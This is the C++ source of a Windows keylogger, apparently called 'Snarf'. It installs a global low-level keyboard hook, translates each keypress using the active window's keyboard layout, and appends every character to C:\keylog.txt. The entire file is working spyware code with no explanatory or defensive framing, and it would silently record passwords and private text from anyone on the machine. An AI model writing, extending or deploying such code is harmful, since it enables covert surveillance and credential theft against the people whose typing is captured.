#include <iostream>
#include <fstream>
#include "keylog.h"

HHOOK _hook;

LRESULT __stdcall LogKeys(int keyCode, WPARAM event, LPARAM kbd) {
    
    if (keyCode >= 0 && event == WM_KEYDOWN) {
        
        KBDLLHOOKSTRUCT kbdStruct = *((KBDLLHOOKSTRUCT*)kbd);
        DWORD threadID;
        HKL kbdLayout;
        HWND foreground = GetForegroundWindow();
        if(foreground) {
            threadID = GetWindowThreadProcessId(foreground, NULL);
            kbdLayout = GetKeyboardLayout(threadID);
        } else {
            return CallNextHookEx(_hook, keyCode, event, kbd);
        }

        char key;
        key = MapVirtualKeyExA(kbdStruct.vkCode, MAPVK_VK_TO_CHAR, kbdLayout);

        std::ofstream logFile;
        logFile.open("C:\\keylog.txt", std::ofstream::app | std::ofstream::binary);
        logFile << key;
        logFile.close();
    }

    return CallNextHookEx(_hook, keyCode, event, kbd);
}

int RegisterHook() {
    static HINSTANCE hinstDLL;
    hinstDLL = LoadLibrary(TEXT("user32.dll"));
    if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, LogKeys, hinstDLL, 0))) {
        MessageBoxA(NULL, (LPCSTR)"Failed to install Snarf hook!", (LPCSTR)"Error", MB_ICONERROR);
        return 1;
    }

    return 0;
}